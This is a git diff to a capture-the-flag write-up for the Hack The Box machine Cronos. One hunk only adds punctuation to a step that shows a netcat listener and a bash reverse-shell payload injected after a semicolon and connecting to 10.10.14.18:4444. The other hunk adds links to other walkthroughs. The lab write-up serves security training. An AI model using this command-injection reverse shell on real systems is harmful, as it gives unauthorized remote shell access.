@@ -71,7 +71,7 @@ gobuster dns -d cronos.htb -w /usr/share/wordlists/seclists/Discovery/DNS/nameli
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/5933aa22-258b-4e2a-a2ec-dd75145e7892)
 
 + Start a netcat listener: `nc -lnvp 4444`
-+ Inject reverse payload after `;`  `/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.14.18/4444 0>&1"` and execute
++ Inject reverse payload after `;`  `/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.14.18/4444 0>&1"` and execute.
 + Get shell.
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/765ae797-f4f3-4efc-8602-2587e6aeba6a)
@@ -102,4 +102,7 @@ gobuster dns -d cronos.htb -w /usr/share/wordlists/seclists/Discovery/DNS/nameli
 + https://vvmlist.github.io/#cronos
 + https://0xdf.gitlab.io/2020/04/14/htb-cronos.html
 + https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/linux-boxes/cronos-writeup-w-o-metasploit
-+ 
++ https://alessandrocristofanilli.xyz/posts/htb-cronos/
++ https://systemweakness.com/htb-cronos-walkthrough-3f669386b681
++ https://medium.com/cronos-htb-walkthough/cronos-htb-walkthrough-9ef91750726
++ https://sevenlayers.com/index.php/133-hackthebox-cronos-walkthrough
